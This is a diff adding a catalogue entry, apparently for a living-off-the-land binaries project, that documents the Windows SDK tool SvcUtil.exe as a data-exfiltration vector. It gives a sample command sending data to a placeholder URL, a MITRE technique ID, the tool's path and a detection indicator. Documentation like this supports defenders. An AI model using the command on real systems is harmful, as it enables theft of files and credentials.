@@ -1,0 +1,22 @@
+---
+Name: SvcUtil.exe
+Description: ServiceModel Metadata Utility Tool included with the Microsoft Windows SDK
+Author: Avihay Eldad
+Created: 2024-04-25
+Commands:
+  - Command: SvcUtil.exe http://example.com/ExfilData
+    Description: Upload file, credentials or data exfiltration in general
+    Usecase: Exfilitrate data to remote server
+    Category: Upload
+    Privileges: User
+    MitreID: T1567
+    OperatingSystem: Windows
+Full_Path:
+  - Path: C:\Program Files (x86)\Microsoft SDKs\Windows\{version}\bin\NETFX {version} Tools\SvcUtil.exe
+Detection:
+  - IOC: SvcUtil making unexpected network connections or DNS requests
+Acknowledgement:
+  - Person: Avihay Eldad
+    Handle: '@AvihayEldad'
+  - Person: Yuval Saban
+    Handle: '@yuvalsaban3'
